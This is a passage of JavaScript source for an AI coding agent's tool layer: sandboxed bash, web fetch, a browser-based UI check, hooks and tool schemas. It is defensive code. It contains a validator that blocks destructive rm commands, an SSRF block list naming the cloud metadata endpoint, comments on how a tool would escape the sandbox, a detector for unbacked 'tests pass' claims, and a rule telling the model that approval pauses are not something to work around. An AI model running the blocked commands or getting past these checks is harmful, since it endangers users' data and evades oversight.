    // workspace root itself (`.`, `./`, `*`) recursively — also unconditional.
    if (base === "rm") {
      const rest = seg.slice(seg.indexOf("rm") + 2);
      if (/(^|\s)(\/|~)/.test(rest)) return "rm may only be used with relative paths inside the workspace";
      if (/-[a-z]*r/i.test(rest) && /(^|\s)(\.|\.\/|\*)(\s|$)/.test(rest)) {
        return "recursive rm of the whole workspace (., ./, *) is blocked";
      }
    }
  }
  return null;
}

/**
 * Run a command through a runtime.
 *
 * `runtime` is required and comes first. That ordering is deliberate: this used
 * to be `runBash(command, cwd, timeout)` executing directly on the host, and
 * making the runtime an optional trailing argument would have let a forgotten
 * call site keep running on the host under a sandbox flag — silently, and
 * exactly where it matters most. A missing runtime is now a TypeError at the
 * call site, in tests, rather than a security hole in production.
 */
function runBash(runtime, command, { cwd = null, timeoutMs = 120_000 } = {}) {
  if (!runtime || typeof runtime.exec !== "function") {
    throw new TypeError("runBash requires an ExecutionRuntime — see core/runtime/contract.mjs");
  }
  return runtime.exec(command, { cwd, timeoutMs });
}

// ── Background bash tasks (Claude Code-style run_in_background) ──────────────
// runBash above is fully synchronous — it only resolves when the child exits
// or the timeout kills it. A dev server / watch task never exits, so any
// attempt to start one this way just hangs the tool call for minutes and then
// gets killed with nothing useful to show — which is exactly why the agent
// would never actually start one itself and would just tell the user to run
// the command. This mirrors Claude Code's real mechanism instead: bash gets a
// `run_in_background` option that spawns detached and returns immediately
// with a task id; `bash_output` polls that task's accumulated output/status;
// `kill_shell` stops it (e.g. before restarting the same server on a
// different port). Tasks live for the life of the server process — an
// in-memory registry is enough for a dev tool, no persistence needed.

// Background tasks now live in the runtime that owns them (see
// core/runtime/host.mjs). That is not bookkeeping tidiness: a background
// process started inside a container must be tracked, polled and killed inside
// that container, and a module-level registry here would have been a host-side
// map of host-side PIDs — which is precisely how "run_in_background is
// sandboxed" turns out to be false.

async function runBashBackground(runtime, command, { cwd = null } = {}) {
  if (!runtime || typeof runtime.execBackground !== "function") {
    throw new TypeError("runBashBackground requires an ExecutionRuntime");
  }
  return runtime.execBackground(command, { cwd });
}

function killBackgroundTask(runtime, id) {
  if (!runtime || typeof runtime.killBackground !== "function") {
    throw new TypeError("killBackgroundTask requires an ExecutionRuntime");
  }
  return runtime.killBackground(id);
}

async function readBackgroundTaskOutput(runtime, id) {
  if (!runtime || typeof runtime.readBackgroundOutput !== "function") {
    throw new TypeError("readBackgroundTaskOutput requires an ExecutionRuntime");
  }
  return runtime.readBackgroundOutput(id);
}

// ── grep ─────────────────────────────────────────────────────────────────────
// The ripgrep/grep strategy lives in the runtime too, because "search the
// workspace" has to mean "search wherever the workspace actually is".

async function grepWorkspace(runtime, pattern, fileGlob) {
  if (!runtime || typeof runtime.grep !== "function") {
    throw new TypeError("grepWorkspace requires an ExecutionRuntime");
  }
  return runtime.grep(pattern, fileGlob);
}

// ── glob ──────────────────────────────────────────────────────────────────────

export function globToRegex(glob) {
  let re = "";
  for (let i = 0; i < glob.length; i++) {
    const c = glob[i];
    if (c === "*") {
      if (glob[i + 1] === "*") { re += "(?:.*)"; i++; if (glob[i + 1] === "/") i++; }
      else re += "[^/]*";
    } else if (c === "?") re += "[^/]";
    else if (".+^${}()|[]\\".includes(c)) re += "\\" + c;
    else re += c;
  }
  return new RegExp(`^${re}$`, "i");
}

// ── Skills (model-selected knowledge packs) ──────────────────────────────────

const BUILTIN_SKILLS_DIR = path.join(__dirname, "..", "skills");

function parseSkillFrontmatter(raw) {
  const fm = raw.match(/^---\n([\s\S]*?)\n---\n?/);
  const body = raw.replace(/^---\n[\s\S]*?\n---\n?/, "").trim();
  const get = (key) => (fm?.[1].match(new RegExp(`^${key}:\\s*(.+)$`, "m"))?.[1] || "").trim();
  return { name: get("name"), description: get("description"), body };
}

export async function loadSkillIndex(workspacePath) {
  const dirs = [BUILTIN_SKILLS_DIR];
  if (workspacePath) dirs.push(path.join(workspacePath, ".kodo", "skills"));
  const index = [];
  const seen = new Set();
  for (const dir of dirs) {
    let entries = [];
    try { entries = await fs.readdir(dir); } catch { continue; }
    for (const fileName of entries) {
      if (!fileName.endsWith(".md") || fileName.startsWith("_")) continue;
      try {
        const raw = await fs.readFile(path.join(dir, fileName), "utf-8");
        const { name, description } = parseSkillFrontmatter(raw);
        const skillName = name || fileName.replace(/\.md$/, "");
        if (seen.has(skillName)) continue;
        seen.add(skillName);
        index.push({ name: skillName, description: description || "(no description)", file: path.join(dir, fileName) });
      } catch { /* skip unreadable */ }
    }
  }
  return index;
}

async function loadSkillByName(workspacePath, skillName) {
  const wanted = String(skillName || "").trim().toLowerCase();
  if (!wanted) return null;
  const index = await loadSkillIndex(workspacePath);
  const hit =
    index.find((s) => s.name.toLowerCase() === wanted) ||
    index.find((s) => s.name.toLowerCase().includes(wanted) || wanted.includes(s.name.toLowerCase()));
  if (!hit) return null;
  try {
    const raw = await fs.readFile(hit.file, "utf-8");
    return { name: hit.name, body: parseSkillFrontmatter(raw).body };
  } catch { return null; }
}

// ── Web tools ─────────────────────────────────────────────────────────────────

const WEB_TIMEOUT_MS = 15_000;
const MAX_WEB_BYTES = 600_000;
const MAX_WEB_TEXT_CHARS = 6_000;
const WEB_UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36 KodoAgent/2.0";

function htmlToText(html) {
  return String(html)
    .replace(/<script[\s\S]*?<\/script>/gi, " ")
    .replace(/<style[\s\S]*?<\/style>/gi, " ")
    .replace(/<!--[\s\S]*?-->/g, " ")
    .replace(/<\/(p|div|section|article|li|h[1-6]|tr|br|header|footer|nav)>/gi, "\n")
    .replace(/<[^>]+>/g, " ")
    .replace(/&nbsp;/g, " ").replace(/&amp;/g, "&").replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">").replace(/&quot;/g, '"').replace(/&#39;|&apos;/g, "'")
    .replace(/[ \t]+/g, " ").replace(/\n[ \t]*/g, "\n").replace(/\n{3,}/g, "\n\n")
    .trim();
}

function extractDesignSignals(html) {
  const uniq = (arr, cap) => [...new Set(arr)].slice(0, cap);
  return {
    title: (html.match(/<title[^>]*>([^<]{1,150})/i) || [])[1]?.trim() || "",
    description: (html.match(/<meta[^>]+name=["']description["'][^>]+content=["']([^"']{1,250})/i) || [])[1] || "",
    colors: uniq(html.match(/#[0-9a-fA-F]{6}\b/g) || [], 12),
    gradients: uniq((html.match(/linear-gradient\([^)]{10,90}\)|radial-gradient\([^)]{10,90}\)/g) || []).map((g) => g.replace(/\s+/g, " ")), 4),
    fonts: uniq((html.match(/font-family:\s*([^;"'}<>]{3,60})/gi) || []).map((f) => f.replace(/font-family:\s*/i, "").trim()), 5),
  };
}

// Block SSRF to loopback / private / link-local hosts. Without this the agent
// could be steered into fetching internal services (its own API on :9000, other
// localhost apps) or the cloud metadata endpoint (169.254.169.254) that hands
// out credentials. Not a defence against DNS-rebinding, but it stops the direct
// cases. (Applies to fetch_url; web_search is pinned to duckduckgo.)
function isBlockedFetchHost(hostname) {
  const h = String(hostname || "").toLowerCase().replace(/^\[|\]$/g, "");
  if (!h) return true;
  if (h === "localhost" || h.endsWith(".localhost") || h.endsWith(".local") || h === "::1" || h === "0.0.0.0") return true;
  const m = h.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (m) {
    const a = Number(m[1]), b = Number(m[2]);
    if (a === 127 || a === 10 || a === 0) return true;                 // loopback / private / this-network
    if (a === 169 && b === 254) return true;                          // link-local + cloud metadata
    if (a === 172 && b >= 16 && b <= 31) return true;                 // private
    if (a === 192 && b === 168) return true;                          // private
  }
  return false;
}

export async function fetchUrl(rawUrl) {
  let url;
  try { url = new URL(String(rawUrl).trim()); } catch { return { success: false, error: `Invalid URL: ${rawUrl}` }; }
  if (!/^https?:$/.test(url.protocol)) return { success: false, error: "Only http/https URLs are allowed" };
  if (isBlockedFetchHost(url.hostname)) return { success: false, error: "Blocked: refusing to fetch a loopback/private/link-local address." };
  try {
    const res = await fetch(url, {
      signal: AbortSignal.timeout(WEB_TIMEOUT_MS),
      redirect: "follow",
      headers: { "user-agent": WEB_UA, accept: "text/html,application/xhtml+xml,application/json,*/*" },
    });
    let body = await res.text();
    if (body.length > MAX_WEB_BYTES) body = body.slice(0, MAX_WEB_BYTES);
    const contentType = res.headers.get("content-type") || "";
    if (/json/i.test(contentType)) {
      return { success: true, url: url.href, status: res.status, content_type: "json", text: body.slice(0, MAX_WEB_TEXT_CHARS) };
    }
    const signals = extractDesignSignals(body);
    return { success: true, url: url.href, status: res.status, ...signals, text: htmlToText(body).slice(0, MAX_WEB_TEXT_CHARS) };
  } catch (err) {
    return { success: false, error: `Fetch failed for ${url.href}: ${String(err?.message || err).slice(0, 120)}` };
  }
}

// Real runtime/visual verification for UI work: a component can typecheck
// and lint clean while still throwing on render, showing a blank page, or
// crashing in the browser — validateSyntax only proves the TEXT parses, it
// never executes anything. Driven through a real Playwright MCP server (a
// separate child process, not in-process — see services/mcpClient.mjs) so a
// crashed/hung browser can't take the main backend process down with it.
// Loopback-only by default for the same reason curl is above: the real use
// case is checking a dev server the agent itself just started.
//
// verify_ui is ONE compound tool rather than exposing the raw MCP tool
// surface (browser_click, browser_navigate, ...) directly to the model: the
// model hands it a batch of actions + assertions, and everything in between
// (running the batch, collecting console/network signals, evaluating
// assertions, deciding pass/fail, and optionally escalating to a vision
// model on an unexplained failure) happens in one tool call instead of many
// round-trips through the main loop.

async function runMcpAction(client, action) {
  const type = String(action?.type || "").toLowerCase();
  switch (type) {
    case "navigate":
      return client.callTool("browser_navigate", { url: action.url || action.text || "" });
    case "click":
      return client.callTool("browser_click", { target: action.selector || "", element: action.selector || "element" });
    case "fill":
      return client.callTool("browser_type", { target: action.selector || "", text: action.text ?? "", element: action.selector || "element", submit: !!action.submit });
    case "wait_for":
      return client.callTool("browser_wait_for", { time: action.seconds, text: action.text, textGone: action.text_gone });
    default:
      throw new Error(`Unknown action type "${action?.type}" — expected one of: navigate, click, fill, wait_for.`);
  }
}

async function runAssertion(client, assertion, signals) {
  const type = String(assertion?.type || "").toLowerCase();
  if (type === "no_console_errors") {
    return { ...assertion, pass: signals.consoleErrorCount === 0, detail: `${signals.consoleErrorCount} console error(s)` };
  }
  if (type === "no_network_errors") {
    return { ...assertion, pass: signals.networkErrorCount === 0, detail: `${signals.networkErrorCount} failed (4xx/5xx) network request(s)` };
  }
  if (type === "visible" || type === "text_contains") {
    const fn = type === "visible"
      ? `() => { const el = document.querySelector(${JSON.stringify(assertion.selector || "")}); return !!el && !!(el.offsetWidth || el.offsetHeight || (el.getClientRects && el.getClientRects().length)); }`
      : `() => document.body.innerText.includes(${JSON.stringify(assertion.text || "")})`;
    try {
      const res = await client.callTool("browser_evaluate", { function: fn });
      const trimmed = res.text.trim();
      const pass = /true/i.test(trimmed) && !/false/i.test(trimmed);
      return { ...assertion, pass, detail: trimmed.slice(0, 200) };
    } catch (err) {
      return { ...assertion, pass: false, detail: `evaluate failed: ${String(err?.message || err).slice(0, 150)}` };
    }
  }
  return { ...assertion, pass: false, detail: `Unknown assertion type "${assertion?.type}" — expected one of: visible, text_contains, no_console_errors, no_network_errors.` };
}

// One-off vision-model call, deliberately NOT going through chatWithTools
// (agentChat.mjs's multimodal content handling isn't verified for both
// provider paths — see resolveVisionCreds above). OpenAI-compatible only for
// v1 (covers openai/gapgpt/qwen-vl/local vision models); an Anthropic vision
// route is skipped rather than sent malformed content.
async function analyzeScreenshotWithVision(visionCreds, { imagePath, promptContext }) {
  if (!visionCreds || visionCreds.provider === "anthropic") return null;
  try {
    const buffer = await fs.readFile(imagePath);
    const dataUrl = `data:image/png;base64,${buffer.toString("base64")}`;
    const client = new OpenAI({ apiKey: visionCreds.apiKey, baseURL: visionCreds.baseURL, timeout: 30_000, maxRetries: 1 });
    const response = await client.chat.completions.create({
      model: visionCreds.model,
      temperature: 0.1,
      max_tokens: 300,
      messages: [
        { role: "system", content: "You are helping a coding agent debug a UI. Given a screenshot and the checks that failed, describe concisely and concretely what's visually wrong (layout, missing elements, broken styling, error text shown, etc). Be specific and brief." },
        { role: "user", content: [
          { type: "text", text: promptContext },
          { type: "image_url", image_url: { url: dataUrl } },
        ] },
      ],
    });
    return response.choices?.[0]?.message?.content?.trim() || null;
  } catch (err) {
    console.warn("[verify_ui] vision escalation failed:", String(err?.message || err).slice(0, 200));
    return null; // never fail the whole verify_ui call because vision escalation failed
  }
}

export async function verifyUi(args, ctx) {
  const { root, mcpServers, mcpClients, visionCreds, runtime } = ctx;

  // REFUSED UNDER A SANDBOX, for two independent reasons — either alone would
  // be disqualifying:
  //
  //  1. It spawns a HOST Playwright MCP process (this is the one path that
  //     reaches spawnMcpServer without going through discoverMcpTools, so the
  //     sandbox gate there does not cover it), and it writes its screenshot to
  //     the workspace with host `fs` rather than through the runtime. Both are
  //     straightforward escapes from a confined run.
  //
  //  2. Even if those were fixed, it would be WRONG: verify_ui only accepts
  //     loopback URLs, and a host browser's "localhost" is the host's, not the
  //     container's. The dev server a sandboxed agent started lives inside the
  //     sandbox — with `--network none` it is unreachable from the host at all.
  //     The tool would confidently verify the wrong thing, or nothing.
  //
  // Failing closed says so instead. A runtime-aware browser (a browser inside
  // the sandbox) is the real fix and is not implemented.
  if (runtime?.isolated) {
    return {
      success: false,
      error:
        `verify_ui is not available under the ${runtime.name} sandbox. It drives a browser on the HOST, ` +
        "so it would both escape the sandbox and check the host's localhost rather than the sandboxed " +
        "dev server your commands actually started. Verify by running the project's own tests with bash, " +
        "or re-run without --sandbox if you specifically need a browser check.",
    };
  }

  let url;
  try { url = new URL(String(args?.url || "").trim()); } catch { return { success: false, error: `Invalid URL: ${args?.url}` }; }
  if (!/^https?:$/.test(url.protocol)) return { success: false, error: "Only http/https URLs are allowed" };
  if (!isLoopbackHost(url.hostname)) {
    return { success: false, error: `Blocked: verify_ui only checks this project's own local server (localhost/127.0.0.1) by default — "${url.hostname}" is an external target.` };
  }

  const serverConfig = mcpServers?.playwright;
  if (!serverConfig) {
    const exampleConfig = JSON.stringify({ mcpServers: { playwright: { command: "node", args: [PLAYWRIGHT_MCP_CLI, "--headless", "--isolated", "--image-responses", "omit"] } } });
    return {
      success: false,
      error: `No Playwright MCP server configured for this project. Add to .kodo/settings.json: ${exampleConfig} — the path is absolute and points at kodo's own installation (this MCP server ships with kodo, not with your project), so copy it exactly rather than making it relative. UI verification is opt-in per project, same as everything else here.`,
    };
  }

  let client = mcpClients.get("playwright");
  if (!client) {
    client = spawnMcpServer(serverConfig, root);
    mcpClients.set("playwright", client);
  }

  try {
    await client.callTool("browser_navigate", { url: url.href });
  } catch (err) {
    return { success: false, error: `Failed to navigate to ${url.href}: ${String(err?.message || err).slice(0, 300)}` };
  }

  const actionsResult = [];
  for (const action of Array.isArray(args?.actions) ? args.actions : []) {
    try {
      const res = await runMcpAction(client, action);
      actionsResult.push({ action, ok: !res.isError, detail: res.text.slice(0, 200) });
      if (res.isError) break; // fail fast — later actions likely depend on this one succeeding
    } catch (err) {
      actionsResult.push({ action, ok: false, detail: String(err?.message || err).slice(0, 200) });
      break;
    }
  }

  const [consoleRes, networkRes] = await Promise.all([
    client.callTool("browser_console_messages", { level: "warning" }).catch((e) => ({ text: String(e?.message || e) })),
    client.callTool("browser_network_requests", { static: false }).catch((e) => ({ text: String(e?.message || e) })),
  ]);
  const consoleErrorCount = parseInt((consoleRes.text.match(/Errors:\s*(\d+)/i) || [])[1] || "0", 10);
  const networkErrorCount = (networkRes.text.match(/\b[45]\d{2}\b/g) || []).length;
  const signals = { consoleErrorCount, networkErrorCount };

  const assertionDefs = Array.isArray(args?.assertions) && args.assertions.length ? args.assertions : [{ type: "no_console_errors" }];
  const assertionsResult = [];
  for (const a of assertionDefs) assertionsResult.push(await runAssertion(client, a, signals));

  const actionsOk = actionsResult.every((a) => a.ok);
  const assertionsOk = assertionsResult.every((a) => a.pass);
  const pass = actionsOk && assertionsOk;

  const result = {
    success: true,
    pass,
    url: url.href,
    actions_result: actionsResult,
    assertions_result: assertionsResult,
    console_errors_count: consoleErrorCount,
    console_summary: consoleRes.text.slice(0, 400),
    network_errors_count: networkErrorCount,
    network_summary: networkRes.text.slice(0, 400),
  };

  if (!pass) {
    // Escalate to vision only when text signals DON'T already explain the
    // failure — a loud console/network error already tells the story; it's
    // the SILENT failures (an assertion is false, nothing logged) that most
    // need eyes on the actual pixels. Silently skipped (not an error) when
    // no vision model is configured — that's a user choice, not a fault.
    const silentFailure = consoleErrorCount === 0 && networkErrorCount === 0;
    if (silentFailure && visionCreds) {
      const screenshotPath = path.join(root, ".kodo", "scratch", `verify-ui-${Date.now()}.png`);
      await fs.mkdir(path.dirname(screenshotPath), { recursive: true });
      try {
        await client.callTool("browser_take_screenshot", { filename: screenshotPath, fullPage: true });
        result.screenshot_saved_to = screenshotPath;
        const failedAssertions = assertionsResult.filter((a) => !a.pass)
          .map((a) => `${a.type}${a.selector ? ` (${a.selector})` : ""}${a.text ? ` "${a.text}"` : ""}`).join(", ");
        const visionSummary = await analyzeScreenshotWithVision(visionCreds, {
          imagePath: screenshotPath,
          promptContext: `This screenshot is from an automated UI check of ${url.href}. These checks failed with no console or network errors to explain why: ${failedAssertions}. Describe concisely what's visually wrong.`,
        });
        if (visionSummary) result.vision_summary = visionSummary;
      } catch (err) {
        result.screenshot_error = String(err?.message || err).slice(0, 200);
      }
    } else if (silentFailure && !visionCreds) {
      result.vision_unavailable_reason = "no vision-capable model configured — add one in Settings to enable visual diagnosis of silent UI failures (checks that fail with no console/network error to explain them)";
    }
  }

  return result;
}

export async function webSearch(query) {
  const q = String(query || "").trim().slice(0, 200);
  if (!q) return { success: false, error: "query is required" };
  try {
    const res = await fetch(`https://html.duckduckgo.com/html/?q=${encodeURIComponent(q)}`, {
      signal: AbortSignal.timeout(WEB_TIMEOUT_MS),
      headers: { "user-agent": WEB_UA, accept: "text/html" },
    });
    const html = await res.text();
    const stripTags = (s) => htmlToText(s).replace(/\n+/g, " ").trim();
    const results = [];
    const linkRe = /<a[^>]+class="result__a"[^>]+href="([^"]+)"[^>]*>([\s\S]*?)<\/a>/g;
    const snippetRe = /class="result__snippet"[^>]*>([\s\S]*?)<\/a>/g;
    const snippets = [...html.matchAll(snippetRe)].map((m) => stripTags(m[1]));
    let i = 0;
    for (const m of html.matchAll(linkRe)) {
      let target = m[1];
      const uddg = target.match(/[?&]uddg=([^&]+)/);
      if (uddg) { try { target = decodeURIComponent(uddg[1]); } catch { /* keep raw */ } }
      if (/duckduckgo\.com\/y\.js|ad_domain=/.test(m[1])) { i++; continue; }
      results.push({ title: stripTags(m[2]), url: target, snippet: snippets[i] || "" });
      i++;
      if (results.length >= 5) break;
    }
    if (results.length === 0) return { success: false, error: "No results" };
    return { success: true, query: q, results };
  } catch (err) {
    return { success: false, error: `Search failed: ${String(err?.message || err).slice(0, 120)}` };
  }
}

// ── Undo snapshots (same on-disk format the undo service reads) ───────────────

function normalizeId(prefix, id) {
  if (!id) return id;
  const p = `${prefix}_`;
  return String(id).startsWith(p) ? id : `${p}${id}`;
}

async function snapshotForUndo(root, sessionId, requestId, relPath, absPath) {
  try {
    const snapshotDir = path.join(HISTORY_ROOT, normalizeId("sess", sessionId), normalizeId("req", requestId));
    await fs.mkdir(snapshotDir, { recursive: true });
    const metaPath = path.join(snapshotDir, "meta.json");

    let meta = { sessionId: normalizeId("sess", sessionId), requestId: normalizeId("req", requestId), workspacePath: root, createdAt: new Date().toISOString(), files: [] };
    try { meta = JSON.parse(await fs.readFile(metaPath, "utf-8")); } catch {}

    // First mutation of a file in this request captures the TRUE pre-request
    // state; later mutations of the same file must not re-snapshot.
    if ((meta.files || []).some((f) => f.relativePath === relPath)) return;

    let previousContent = null;
    let existedBefore = true;
    try { previousContent = await fs.readFile(absPath, "utf-8"); } catch { existedBefore = false; }

    let snapshotPath = null;
    if (existedBefore && previousContent !== null) {
      snapshotPath = path.join(snapshotDir, relPath.replace(/[/\\]/g, "__") + ".snap");
      await fs.writeFile(snapshotPath, previousContent, "utf-8");
    }

    meta.files = [...(meta.files || []), { relativePath: relPath, fullPath: absPath, existedBefore, snapshotPath }];
    await fs.writeFile(metaPath, JSON.stringify(meta, null, 2), "utf-8");
  } catch (err) {
    console.warn("[AgentLoop] undo snapshot failed:", err.message);
  }
}

// ── Workspace settings: hooks + permissions + mcpServers ──────────────────────
// One file, {workspace}/.kodo/settings.json, mirroring Claude Code's own
// settings.json shape ({ hooks, permissions, mcpServers } side by side):
//   {
//     "hooks": { "postEdit": "prettier --write {file}", "stop": "npm run typecheck" },
//     "permissions": { "allow": ["Bash(git push:*)"], "ask": [...], "deny": [...] },
//     "mcpServers": { "playwright": { "command": "node", "args": ["<absolute path to kodo's node_modules/@playwright/mcp/cli.js>", "--headless", "--isolated"] } }
//   }
// mcpServers is opt-in per project, same as everything else here — no
// capability (browser automation, future DB/Figma servers, etc.) exists
// until a project declares it, matching Claude Code's real .mcp.json. The
// path MUST be absolute: verify_ui spawns the server with cwd set to the
// TARGET project's workspace, not kodo's own directory, so a relative path
// resolves against the wrong filesystem location and the server exits
// immediately (see PLAYWRIGHT_MCP_CLI below, and the exact absolute path
// verify_ui itself suggests when mcpServers.playwright isn't configured).

function normalizePermissions(p) {
  const arr = (v) => (Array.isArray(v) ? v.filter((x) => typeof x === "string") : []);
  return { allow: arr(p?.allow), ask: arr(p?.ask), deny: arr(p?.deny) };
}

// Accepts Claude Code's two server shapes side by side:
//   stdio  { "command": "npx", "args": [...], "env": {...} }
//   remote { "type": "http" | "sse", "url": "https://…", "headers": {...} }
// A malformed entry is dropped rather than throwing — one bad server must not
// take down every other tool the project declared.
export function normalizeMcpServers(m) {
  if (!m || typeof m !== "object") return {};
  const obj = (v) => (v && typeof v === "object" && !Array.isArray(v) ? v : {});
  const out = {};
  for (const [name, cfg] of Object.entries(m)) {
    if (!cfg || typeof cfg !== "object") continue;
    const type = cfg.type || (typeof cfg.command === "string" ? "stdio" : typeof cfg.url === "string" ? "http" : null);

    if (type === "stdio" && typeof cfg.command === "string") {
      out[name] = {
        type: "stdio",
        command: cfg.command,
        args: Array.isArray(cfg.args) ? cfg.args.filter((a) => typeof a === "string") : [],
        env: obj(cfg.env),
      };
    } else if ((type === "http" || type === "sse") && typeof cfg.url === "string") {
      out[name] = { type, url: cfg.url, headers: obj(cfg.headers) };
    }
  }
  return out;
}

export async function loadKodoSettings(root) {
  try {
    const raw = JSON.parse(await fs.readFile(path.join(root, ".kodo", "settings.json"), "utf-8"));
    return {
      hooks: (raw && typeof raw.hooks === "object" && raw.hooks) || {},
      permissions: normalizePermissions(raw?.permissions),
      mcpServers: normalizeMcpServers(raw?.mcpServers),
    };
  } catch {
    return { hooks: {}, permissions: normalizePermissions(null), mcpServers: {} };
  }
}

// verify_ui spawns MCP server child processes lazily into ctx.mcpClients
// (empty for the overwhelming majority of runs that never call it). Whatever
// got spawned MUST be torn down before the run ends, or a headless Chromium
// instance is orphaned per run that used it — these are real OS processes,
// not something GC reclaims.
// Pooled clients (see services/mcpTools.mjs) are deliberately kept alive
// between runs so the next turn doesn't pay the spawn + handshake again; the
// pool's own idle sweep reclaims them. Only clients this run owns outright —
// e.g. one verify_ui spawned directly — are torn down here.
function closeMcpClients(ctx) {
  for (const client of ctx.mcpClients?.values() || []) {
    if (isPooledClient(client)) continue;
    try { client.close(); } catch { /* best-effort */ }
  }
}

async function runPostEditHook(runtime, relPath, hooks, emit) {
  const cmd = hooks?.postEdit;
  if (!cmd || typeof cmd !== "string") return;
  const finalCmd = cmd.replaceAll("{file}", shellQuote(relPath));
  const invalid = validateBashCommand(finalCmd);
  if (invalid) { console.warn(`[AgentLoop] postEdit hook rejected: ${invalid}`); return; }
  emit?.({ type: "progress", stage: "executing", message: `hook: ${finalCmd.slice(0, 80)}` });
  const res = await runBash(runtime, finalCmd, { timeoutMs: 30_000 });
  if (res.exit_code !== 0) console.warn(`[AgentLoop] postEdit hook failed (${res.exit_code}): ${String(res.stderr).slice(0, 200)}`);
}

// ── Stop hook (verification) ──────────────────────────────────────────────────
// Kodo runs on arbitrary, per-user workspaces — it has no reliable way to
// guess a project's toolchain (script names, package manager, whether it even
// uses npm/eslint/tsc at all). Heuristically sniffing package.json for likely
// script names is always wrong for somebody. Claude Code doesn't solve this by
// guessing either: verification is (a) the model's own job, self-directed —
// it reads the project and runs whatever "npm test" / "cargo check" / etc.
// actually applies, the same way it would for any unfamiliar repo — and (b)
// optionally backstopped by a Stop hook the PROJECT declares for itself, since
// only the project's own author knows what "verified" really means for it.
// This mirrors that exactly: a `stop` command in {workspace}/.kodo/settings.json
// runs once after a turn that edited files, before the agent may finish. A
// non-zero exit blocks completion and its output is fed back as the reason —
// same contract as Claude Code's Stop hook (and this file's own postEdit
// hook above). With no hook configured, nothing is auto-run and no "verified"
// claim is made — verification is whatever the model itself chose to do,
// exactly as the VERIFY step in the system prompt already asks for.
// Matches confident-sounding verification claims a model might write in its
// own FINISH-step prose ("✅ Verified", "tests pass", "typecheck and lint
// pass", "build succeeds", etc.) — used to catch the claim when nothing in
// this turn actually backs it up. See the anti-fabrication backstop below.
const VERIFICATION_CLAIM_RE = /(✅\s*)?\bverified\b|\btests?\s+pass(ed|es)?\b|\btypecheck(ing)?\s+(and\s+lint\s+)?pass(ed|es)?\b|\blint(ing)?\s+pass(ed|es)?\b|\bbuild\s+(succeed(s|ed)?|passes?|passed|is\s+successful)\b/gi;
// A denial ("not verified", "couldn't run tests", "unable to verify") right
// before a match means the model is ALREADY being honest — don't flag that
// as a fabricated claim, or the correction note would contradict a sentence
// that was true.
const DENIAL_BEFORE_RE = /\b(not|n't|no|never|without|unable to|failed to|couldn't|didn't|isn't|wasn't|hasn't|haven't|aren't|weren't)\s+(\w+\s+){0,3}$/i;
// Imported, not redeclared. Two copies of "what counts as a check" drifting
// apart is exactly the kind of gap where the loop believes a run was verified
// and the controller does not — so there is one definition, in the controller.

// True only if `text` asserts verification happened, unhedged by a nearby
// denial ("not verified" doesn't count — that's the model already being
// honest, not a claim to correct).
function hasUnhedgedVerificationClaim(text) {
  const re = new RegExp(VERIFICATION_CLAIM_RE.source, "gi");
  let m;
  while ((m = re.exec(text))) {
    const before = text.slice(Math.max(0, m.index - 40), m.index);
    if (!DENIAL_BEFORE_RE.test(before)) return true;
  }
  return false;
}

export async function runStopHook(runtime, hooks, emit) {
  const cmd = hooks?.stop;
  if (!cmd || typeof cmd !== "string") return { ran: false, passed: true, output: "" };
  const invalid = validateBashCommand(cmd);
  if (invalid) { console.warn(`[AgentLoop] stop hook rejected: ${invalid}`); return { ran: false, passed: true, output: "" }; }
  emit?.({ type: "progress", stage: "executing", message: `🔍 verify: ${cmd.slice(0, 80)}` });
  const res = await runBash(runtime, cmd, { timeoutMs: 120_000 });
  return { ran: true, passed: res.exit_code === 0, output: `${res.stdout}\n${res.stderr}`.trim().slice(0, 3000) };
}

// ── Tool schema ───────────────────────────────────────────────────────────────

// Exported read-only so a test can assert what the model is actually offered.
// The write_file guard is only trustworthy if the schema exposes no override
// argument; that is a property of this list, so the list has to be inspectable.
export const AGENT_TOOLS = [
  {
    type: "function",
    function: {
      name: "read_file",
      description: "Read a file from the workspace. ALWAYS read a file before editing it — never guess contents.",
      parameters: {
        type: "object",
        properties: {
          path: { type: "string", description: "Relative file path from workspace root" },
          start_line: { type: "number", description: "First line (1-indexed, optional)" },
          end_line: { type: "number", description: "Last line (optional)" },
        },
        required: ["path"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "edit_file",
      description: "Replace an exact string in a file. old_string must appear EXACTLY ONCE in the file (include surrounding lines to make it unique). Use replace_all:true to replace every occurrence. The file must have been read first. Fails loudly on ambiguity or syntax breakage — fix and retry.",
      parameters: {
        type: "object",
        properties: {
          path: { type: "string" },
          old_string: { type: "string", description: "Exact text to find (must be unique unless replace_all)" },
          new_string: { type: "string", description: "Replacement text" },
          replace_all: { type: "boolean", description: "Replace all occurrences (default false)" },
        },
        required: ["path", "old_string", "new_string"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "write_file",
      description: "Create a new file or fully overwrite an existing one. For partial changes to an existing file, prefer edit_file. Overwriting an existing file must include everything you are not changing — a rewrite that drops existing exports is always rejected. To delete an export on purpose, use edit_file on that declaration.",
      parameters: {
        type: "object",
        properties: {
          path: { type: "string" },
          content: { type: "string", description: "Complete file content" },
        },
        required: ["path", "content"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "bash",
      description: "Run a shell command in the workspace root (baseline allowlist: node, npm, npx, git, tsc, eslint, curl, ls, grep, etc. — a workspace's .kodo/settings.json permissions can grant additional commands, require approval for some, or block others). Use for: installing packages, running the project's own test/typecheck/lint scripts (check the relevant sub-project's package.json `scripts` — commands run from the workspace root, so `cd`/`npm --prefix` into the right sub-directory first if it's not at the root), git status, moving files, and hitting a server YOU started with curl (e.g. `curl -s http://localhost:5555/api/foo` after starting it with run_in_background) to confirm a route actually responds instead of assuming it does from reading the code. curl is loopback-only by default (localhost/127.0.0.1) — an external URL needs the workspace to opt in via permissions, same as any other non-baseline command. Do NOT use this for reading a file (use read_file), searching file contents (use grep), finding files by name (use glob), or listing a directory (use list_files) — those dedicated tools exist for exactly this and bash's cat/grep/ls/find are only here for when they're one step in a larger shell pipeline. This matters beyond style: edit_file only accepts editing a file that was read via the read_file TOOL specifically (bash cat doesn't count, even though you saw the content) — using bash to \"read\" a file you intend to edit will make the edit fail with a read-it-first error. If a command is rejected as ask-only, it will pause for the user's approval — that's expected, not a failure to work around. CRITICAL: any command that doesn't exit on its own (dev servers, watch mode, `npm run dev`, long-lived processes) MUST be run with run_in_background:true — running it normally will just hang until the timeout and get 